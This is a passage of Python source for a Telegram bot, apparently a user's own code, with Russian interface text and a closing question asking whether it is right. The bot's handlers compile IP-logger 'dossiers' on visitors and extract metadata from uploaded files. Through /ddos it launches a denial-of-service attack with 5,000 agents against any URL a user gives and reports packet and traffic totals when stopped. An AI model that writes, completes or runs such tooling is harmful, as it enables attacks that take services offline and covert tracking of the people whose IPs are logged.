            await update.message.reply_text(response, parse_mode='Markdown')
        
        elif mode == 'dossier':
            try:
                dossier = self.iplogger.get_full_dossier(text)
                if "error" in dossier:
                    await update.message.reply_text("❌ Логгер не найден. Проверь ID.")
                    return
                
                json_path, txt_path = self.iplogger.generate_dossier_files(text)
                
                if json_path and txt_path:
                    with open(json_path, 'rb') as f:
                        await update.message.reply_document(
                            InputFile(f, filename=os.path.basename(json_path)),
                            caption=f"📊 Досье JSON для {text}"
                        )
                    
                    with open(txt_path, 'rb') as f:
                        await update.message.reply_document(
                            InputFile(f, filename=os.path.basename(txt_path)),
                            caption=f"📄 Досье TXT для {text}"
                        )
                    
                    os.remove(json_path)
                    os.remove(txt_path)
                    
                    stats = self.iplogger.get_stats(text)
                    if "error" not in stats:
                        response = (
                            f"📊 **Статистика логгера**\n\n"
                            f"👤 Переходов: {stats['total_hits']}\n"
                            f"🌍 Уникальных IP: {stats['unique_ips']}\n"
                            f"👥 Уникальных посетителей: {stats['unique_visitors']}\n"
                            f"🔄 Статус: {'ИСТЕК' if time.time() > stats.get('expire_at', 0) else 'АКТИВЕН'}"
                        )
                        await update.message.reply_text(response, parse_mode='Markdown')
            except Exception as e:
                await update.message.reply_text(f"❌ Ошибка: {str(e)}")
        
        elif mode == 'ddos':
            user_id = update.effective_user.id
            orchestrator = start_ddos(text, agents=5000)
            self.ddos_attacks[user_id] = orchestrator
            
            await update.message.reply_text(
                f"🔥 **DDOS АТАКА ЗАПУЩЕНА!**\n"
                f"📌 Цель: {text}\n"
                f"👾 Агентов: 5,000\n"
                f"🛑 Остановка: /stopddos"
            )
        
        else:
            await update.message.reply_text(f"❌ Неизвестный режим: {mode}")
    
    async def ddos_command(self, update: Update, context):
        target = " ".join(context.args)
        if not target:
            await update.message.reply_text("❌ Укажи цель: /ddos http://example.com")
            return
        
        user_id = update.effective_user.id
        orchestrator = start_ddos(target, agents=5000)
        self.ddos_attacks[user_id] = orchestrator
        
        await update.message.reply_text(
            f"🔥 **DDOS АТАКА ЗАПУЩЕНА!**\n"
            f"📌 Цель: {target}\n"
            f"👾 Агентов: 5,000\n"
            f"🛑 Остановка: /stopddos"
        )
    
    async def stop_ddos(self, update: Update, context):
        user_id = update.effective_user.id
        if user_id in self.ddos_attacks:
            stats = stop_ddos(self.ddos_attacks[user_id])
            del self.ddos_attacks[user_id]
            
            await update.message.reply_text(
                f"🛑 **АТАКА ОСТАНОВЛЕНА!**\n"
                f"📊 Пакетов: {stats['total_packets']:,}\n"
                f"📊 Байт: {stats['total_bytes']/1024/1024/1024:.2f} GB\n"
                f"👾 Агентов: {stats['total_agents']:,}\n"
                f"⚡ PPS: {stats['packets_per_second']:,.0f}\n"
                f"🔥 Пик PPS: {stats['peak_pps']:,.0f}"
            )
        else:
            await update.message.reply_text("❌ Нет активной атаки")
    
    async def handle_photo(self, update: Update, context):
        if context.user_data.get('mode') == 'metadata':
            photo = update.message.photo[-1]
            file = await context.bot.get_file(photo.file_id)
            file_path = os.path.join(TEMP_FOLDER, f"photo_{time.time()}.jpg")
            await file.download_to_drive(file_path)
            result = MetadataExtractor(file_path).extract_all()
            os.remove(file_path)
            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
    
    async def handle_document(self, update: Update, context):
        if context.user_data.get('mode') == 'metadata':
            doc = update.message.document
            if doc.file_size > 10 * 1024 * 1024:
                await update.message.reply_text("❌ Файл слишком большой (макс 10 МБ)")
                return
            file = await context.bot.get_file(doc.file_id)
            file_path = os.path.join(TEMP_FOLDER, f"doc_{time.time()}_{doc.file_name}")
            await file.download_to_drive(file_path)
            result = MetadataExtractor(file_path).extract_all()
            os.remove(file_path)
            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
    
    def run(self):
        print("⚫ OBSIDIAN OSINT SYSTEM v7.0 запущен")
        self.app.run_polling()

# ================================================================
# ЗАПУСК
# ================================================================
if __name__ == "__main__":
    bot = ObsidianBot()
    bot.run() так ?
